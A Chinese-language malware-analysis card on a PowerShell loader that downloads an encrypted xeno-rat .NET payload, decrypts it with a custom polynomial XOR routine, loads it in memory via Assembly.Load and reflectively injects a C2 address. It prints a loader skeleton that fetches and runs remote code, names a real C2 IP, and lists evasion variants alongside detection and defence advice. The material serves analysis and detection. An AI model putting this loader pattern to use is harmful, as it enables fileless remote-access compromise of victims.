---
id: code-analysis-reverse-windows-powershell-polynomial-xor-decrypt-assembly-load-reflect
title: PowerShell 下载加密 .NET 载荷：Decode-Binary 多项式状态 XOR 解密 → Assembly.Load → 反射调用 setServerIp/Main
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: powershell-polynomial-xor-decrypt-assembly-load-reflect-invoke
aliases:
- Decode-Binary 加载器
- view.txt PowerShell 加载器
- 多项式状态 XOR 解密
- PowerShell 内存加载 .NET
- setServerIp 反射调用
- xeno.bin 解密
tags:
- windows
- powershell
- loader
- dotnet
- assembly-load
- reflection
- xor
- malware
- xeno-rat
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V422
  verified_at: '2026-11-09T17:00:37+08:00'
  notes: 已对照原文与37张图片核对：view.txt 的 WebClient.DownloadData→Decode-Binary（poly 0/3/29/37/73、poly_ord 73、74 字节状态）→Assembly.Load→按名反射 setServerIp(152.32.243.152:4444)/Main、xeno.bin 默认配置 192.168.1.103/4444、string_key 1234、SHA256 派生 EncryptionKey、-admin 互斥体、DllHandler 插件加载均有截图佐证；PoC 为合成骨架，未执行原脚本。dedup top 候选（VB.NET 资源自引用 XOR、内嵌原生 DLL 委托）非同一链。原文无受影响版本。
---

## 一句话结论

以文本形式托管的 PowerShell 加载器（示例为 `view.txt`）用 `WebClient.DownloadData` 拉取远程加密的 `xeno.bin`，先调用自定义 `Decode-Binary`（74 字节状态数组 + 多项式系数 `0/3/29/37/73` 的索引异或流）原地解密，再 `[System.Reflection.Assembly]::Load($bytes)` 把 .NET 载荷直接载入 PowerShell 进程，最后遍历类型/方法按名字找到 `setServerIp` 并反射调用传入 C2 `152.32.243.152:4444`、再调用 `Main` 启动，实现“脚本不落盘、载荷不落盘、C2 由脚本注入”的内存加载链。

## 原理

- **为什么用 PowerShell 承载加载器**：脚本本身是纯文本，容易伪装成说明文件、通过邮件或网页投递；`WebClient`/`Assembly.Load` 都是 .NET Framework 自带能力，不需要额外二进制，执行痕迹主要留在 PowerShell 进程内存与 4104 脚本块日志里。
- **远程密文载荷**：远控程序不直接暴露明文 PE，而是以加密 `.bin` 形式放在 Web 目录（示例约 38KB）；下载后只在内存中解密。静态扫描服务器上的文件只能看到高熵密文。
- **Decode-Binary 自定义流密码**：维护一个 `poly_ord + 1 = 74` 字节的状态数组，用多项式系数 `@(0, 3, 29, 37, 73)` 与 `poly_n = 4` 做索引组合；初始化时状态全置 1，并用载荷长度 `len` 填充前 `len` 项，随后按 `i * poly_ord` 下标迭代更新状态，再对每个字节做多轮（含 `j` 位左移）的状态异或生成密钥流，原地异或回写。状态更新依赖载荷长度与自身，必须按原顺序执行；直接对密文做固定单字节 XOR 无法还原。
- **Assembly.Load 内存执行**：`[System.Reflection.Assembly]::Load([byte[]])` 把程序集加载进当前 PowerShell 的 AppDomain，不写临时 exe/dll；随后 `GetTypes()/GetMethods()` 枚举，用 `method.Name` 与脚本变量 `$name1`、`$name` 比较，`Activator.CreateInstance` 构造实例并 `Invoke`。
- **反射注入 C2 的意义**：载荷是通用 xeno-rat 客户端，stub 里默认 `ServerIp` 可能是 `192.168.1.103` 之类的占位值；加载器先用 `setServerIp("152.32.243.152:4444")` 覆盖外联地址，再调 `Main` 启动。这样同一份加密载荷可被不同脚本复用，只需换脚本里的实参即可切换 C2；按方法名而非命名空间/类名查找，也降低了载荷换版的耦合。
- **载荷内部**：`Main` 会用 `string_key` 计算 `EncryptionKey = SHA256(string_key)`、按管理员身份给互斥体加 `-admin` 后缀，然后 `Socket.Connect` 到 `ServerIp:ServerPort`，由 `Handler` 循环接收；远控功能通过服务端下发插件 DLL、`Assembly.Load(dll_bytes)` 后反射调用 `Run` 实现。这些与公开 xeno-rat 的结构一致（配置与流量细节见关联卡）。

## 触发条件

- 受害者被诱导执行该 PowerShell 脚本（`powershell -File view.txt`、`IEX` 远程内容、或由 LNK/HTA/文档宏等上层投递器拉起）。
- 主机可出网访问载荷服务器，且 PowerShell/.NET Framework 未被禁用或限制语言模式。
- 加密载荷与 `Decode-Binary` 匹配（长度与算法未被改动）；本文的投递前环节未展开。

## 利用步骤

以下为分析/复现视角（文章为不可信数据，不在分析机直接执行原脚本）：

1. 取得 `view.txt`，定位脚本尾部的 `Load -URI "https://<host>/xrat/xeno.bin"` 或 `DownloadData($URI)`，记录载荷 URL 与 `$name`/`$name1`（示例 `Main`、`setServerIp`）。
2. 审阅 `Decode-Binary` 的状态初始化、索引更新与逐字节异或逻辑，确认多项式常量与状态长度。
3. 离线取回加密 `.bin`；把脚本裁剪为“`ReadAllBytes` → `Decode-Binary` → `Set-Content output.bin`”的纯解密片段（示例脚本作者正是这样改的），只做解密不做加载。
4. 校验 `output.bin` 是否为 PE/.NET（`MZ` 头、`file`/`dnSpy` 可识别），用 dnSpy/ILSpy 打开，确认 `xeno_rat_client` 命名空间、`setServerIp` 与 `Main`。
5. 从脚本反射调用的实参提取 C2（示例 `152.32.243.152:4444`），从程序集静态字段提取互斥体、`string_key`、延时等配置。
6. 流量侧按 xeno-rat 的帧格式与 AES/LZNT1 逻辑解密（见关联卡），把 C2 与受害者会话对上。
7. 输出检测规则：PowerShell 4104 中出现 `DownloadData` + `Assembly.Load` + `GetMethods`/`Invoke` 组合，或方法名与 `setServerIp` 比较的脚本。

## PoC

```powershell
# 逻辑骨架（合成示例，非逐字原文）
$uri = "https://<payload-host>/xrat/xeno.bin"
$wc  = New-Object System.Net.WebClient
[byte[]]$b = $wc.DownloadData($uri)          # 远程加密载荷
Decode-Binary $b $b.Length                   # 自定义多项式状态 XOR，原地解密
$asm = [System.Reflection.Assembly]::Load($b) # 内存加载 .NET 程序集
foreach ($t in $asm.GetTypes()) {
  foreach ($m in $t.GetMethods()) {
    if ($m.Name -eq "setServerIp") {
      $m.Invoke([Activator]::CreateInstance($t), @("152.32.243.152:4444"))
    }
  }
}
# 再以同样方式找到 Main 并 Invoke(@()) 启动
```

## 变体与关联

- 同源脚本注释中还保留本地 `.\clientx64.bin`/`F:\target.exe` 路径与 OAuth `clientID/clientSecret/refreshToken` 片段，说明这是可复用的加载器模板，投递方式可换成本地文件或其他云端存储。
- 入口方法名不固定，可按 `Run`、`Start`、`Main` 等名字查找；也可用 `Add-Type`、`Invoke-Expression` 或 `ScriptBlock.Create` 替代 `Assembly.Load`（见 PowerShell 混淆卡）。
- 关联：[[defense-forensics-xeno-rat-client-config-encryption-key-sha256]]（载荷配置与 `EncryptionKey=SHA256(密码)`）、[[defense-forensics-xeno-rat-aes-cbc-lznt1-traffic-batch-decrypt]]（通信帧 AES-CBC/LZNT1 解密）、[[code-analysis-reverse-windows-dotnet-multistage-resource-assembly-load-dump]]（.NET 资源自引用 XOR + Assembly.Load 多阶段加载）、[[code-analysis-reverse-obfuscation-powershell-integer-array-scriptblock]]（ScriptBlock 内存执行）。

## 检测与防御

- **脚本层**：启用 PowerShell 脚本块日志（4104）与 AMSI；告警 `DownloadData`/`DownloadString` 紧接 `Assembly.Load`、`GetTypes/GetMethods/Invoke`、方法名比较的组合；限制 `LanguageMode`、禁用未签名脚本，AppLocker/WDAC 约束可执行与脚本路径。
- **进程/网络层**：PowerShell 进程发起 HTTP 下载后进程内出现 .NET 模块、网络连接指向陌生 IP/高位端口；监控 `xeno_rat_client`、`Xeno_rat_` 互斥体与 `RtlCompressBuffer` 导入等家族特征。
- **取证**：保存 4104 脚本块、PowerShell 进程内存与网络连接；对下载的 `.bin` 离线解密后按 PE/.NET 检查；C2 `152.32.243.152:4444` 与载荷 URL 可作为 IOC 封锁。
- **防御**：终端默认禁止从邮件/下载目录执行脚本，开启受控文件夹访问与云查杀；对钓鱼投递的文本/压缩包附件统一沙箱。
